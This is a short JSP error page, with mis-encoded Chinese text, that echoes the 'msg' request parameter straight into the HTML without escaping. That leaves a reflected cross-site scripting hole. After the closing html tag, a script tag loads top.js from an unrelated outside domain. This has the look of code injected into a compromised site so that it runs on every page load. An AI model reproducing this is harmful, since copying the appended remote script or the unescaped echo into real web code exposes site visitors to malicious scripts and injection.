<%@ page
 contentType="text/html;charset=GBK"
 isErrorPage="true"
 session="true"
%>
<html>
<head>
	<title>����</title>
</head>
<body style="color:red;"><br><br><br><br>
	<center>
		<%//��ȡ������Ϣ���������ҳ���û���
			String sError=request.getParameter("msg");
			out.println("<br>");
			out.println(sError);
		%>
		<hr></hr>
	</center>
</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>